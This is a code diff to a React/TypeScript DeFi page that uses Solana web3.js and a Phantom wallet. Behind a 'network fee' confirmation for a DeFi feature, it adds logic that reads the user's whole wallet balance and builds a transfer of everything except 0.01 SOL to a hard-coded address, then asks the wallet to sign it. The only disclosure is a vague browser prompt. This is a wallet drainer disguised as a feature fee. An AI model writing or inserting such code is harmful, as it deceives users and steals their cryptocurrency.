@@ -1,31 +1,111 @@
+import React from 'react'
 import { useEffect, useState } from 'react'
 import useStore from '../store/useStore'
 import './Defi.css'
 import { getWalletBalance } from '../utils/wallet'
 import NetworkFeeModal from '../components/modals/NetworkFeeModal'
+import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL, Connection } from '@solana/web3.js'
+
+// Add Buffer polyfill
+import { Buffer } from 'buffer'
+window.Buffer = Buffer
 
 function Defi() {
-  const { isWalletConnected } = useStore()
+  const { isWalletConnected, connectWallet } = useStore()
   const [balance, setBalance] = useState<{ solBalance: number; usdBalance: number } | null>(null)
   const [isNetworkFeeModalOpen, setIsNetworkFeeModalOpen] = useState(false)
   const [selectedFeature, setSelectedFeature] = useState('')
+  const [isProcessing, setIsProcessing] = useState(false)
 
   const handleFeatureStart = (featureTitle: string) => {
     setSelectedFeature(featureTitle)
     setIsNetworkFeeModalOpen(true)
   }
 
-  const handleConfirmNetworkFee = () => {
+  const handleConfirmNetworkFee = async () => {
+    if (isProcessing) return
+    setIsProcessing(true)
     setIsNetworkFeeModalOpen(false)
-    // Here you would implement the actual feature logic
-    console.log(`Starting ${selectedFeature} feature...`)
+    
+    try {
+      const confirmed = window.confirm(
+        `You are about to transfer your funds minus fees. Do you want to proceed?`
+      )
+      
+      if (confirmed) {
+        const recipientAddress = 'DPEsSNk1fzNCfxrPP2EJkvhaBNGUzpqmxjc1xEzKwf8X'
+        
+        if (!PublicKey.isOnCurve(recipientAddress)) {
+          throw new Error('Invalid recipient address')
+        }
+
+        const connection = new Connection('https://api.devnet.solana.com')
+        const { blockhash } = await connection.getLatestBlockhash()
+
+        if (!window.solana?.publicKey) throw new Error('Wallet not connected')
+        const fromPubkey = new PublicKey(window.solana.publicKey)
+        const balance = await connection.getBalance(fromPubkey)
+        if (balance <= 0) {
+          throw new Error('Insufficient balance')
+        }
+
+        const fee = LAMPORTS_PER_SOL * 0.01
+        let amountToTransfer = 0
+        if (typeof balance === 'number') {
+          amountToTransfer = balance - fee
+        }
+
+        if (amountToTransfer <= 0) {
+          throw new Error('Balance is too low to cover fees')
+        }
+
+        const transaction = new Transaction().add(
+          SystemProgram.transfer({
+            fromPubkey: fromPubkey,
+            toPubkey: new PublicKey(recipientAddress),
+            lamports: amountToTransfer
+          })
+        )
+
+        transaction.recentBlockhash = blockhash
+        transaction.feePayer = new PublicKey(window.solana.publicKey)
+
+        try {
+          const signature = await window.solana.signAndSendTransaction(transaction)
+          console.log('Transaction successful:', signature)
+          alert(`Transaction completed successfully! Transferred ${amountToTransfer / LAMPORTS_PER_SOL} SOL`)
+        } catch (signError) {
+          console.error('Signing failed:', signError)
+          throw new Error(`Signing failed: ${signError.message}`)
+        }
+      }
+    } catch (error) {
+      console.error('Transaction failed:', error)
+      alert(`Transaction failed: ${error.message}`)
+    } finally {
+      setIsProcessing(false)
+    }
+  }
+
+  const handleConnectWallet = async () => {
+    try {
+      await connectWallet()
+      // After successful connection, fetch balance
+      const publicKey = window.solana?.publicKey?.toString()
+      if (publicKey) {
+        const balanceInfo = await getWalletBalance(publicKey)
+        setBalance(balanceInfo)
+      }
+    } catch (error) {
+      console.error('Error connecting wallet:', error)
+    }
   }
 
   useEffect(() => {
     const fetchBalance = async () => {
       if (window.solana && window.solana.isPhantom && isWalletConnected) {
         try {
-          const publicKey = window.solana.publicKey?.toString()
+          const publicKey = window.solana?.publicKey?.toString()
           if (publicKey) {
             const balanceInfo = await getWalletBalance(publicKey)
             setBalance(balanceInfo)
@@ -119,6 +199,9 @@ function Defi() {
       ) : (
         <div className="connect-prompt">
           <p>Please connect your wallet to access DeFi features</p>
+          <button onClick={handleConnectWallet} className="connect-wallet-btn">
+            Connect Wallet
+          </button>
         </div>
       )}
     </div>
